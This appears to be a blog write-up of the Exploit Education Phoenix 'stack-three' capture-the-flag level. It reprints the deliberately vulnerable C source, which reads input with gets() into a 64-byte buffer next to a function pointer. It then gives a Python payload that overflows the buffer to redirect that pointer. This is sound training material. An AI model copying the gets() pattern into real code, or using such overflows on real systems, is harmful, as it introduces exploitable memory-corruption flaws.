---
title: Protostar - stack_three
date: 2026-05-31 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Protostar stack_three ctf
toc: true
---

## Introduction
I will be explaining how i did the challenge stack_three from the series Protostar found at <https://exploit.education/phoenix/stack-three/>

## Step one
Before debugging it, i inspected the provided source code:

```
/*
 * phoenix/stack-three, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable to 0x0d0a090a
 *
 * When does a joke become a dad joke?
 *   When it becomes apparent.
 *   When it's fully groan up.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}



```
It seems like a buffer overflow attack is used here. Based on `gets(local.buffer)` i assume an input is to be provided. This input must exceed 64 bytes so as to cause it to change `locals.fp`. So the plan is to firstly retrieve the address where the function complete_level is, provide a rigged input and it should work.


## Step two
I set a command at main so that i can view the memory of the function. 

![](assets/posts/PWN/phoenix_stack_three/flagaddress.png)

I cant just directly copy raw bytes into the terminal hence i will the output inside a file via the command:

```
python3 -c 'import sys; sys.stdout.buffer.write(b"A" * 64 + b"\xbd\x61\x55\x56")' > stack_three_payload
```
It is important to use `sys.stdout.buffer.write` due to python treating characters as unicode which may mess up the payload.Now, load the program via gdb and do the following:

![](assets/posts/PWN/phoenix_stack_three/flag.png)

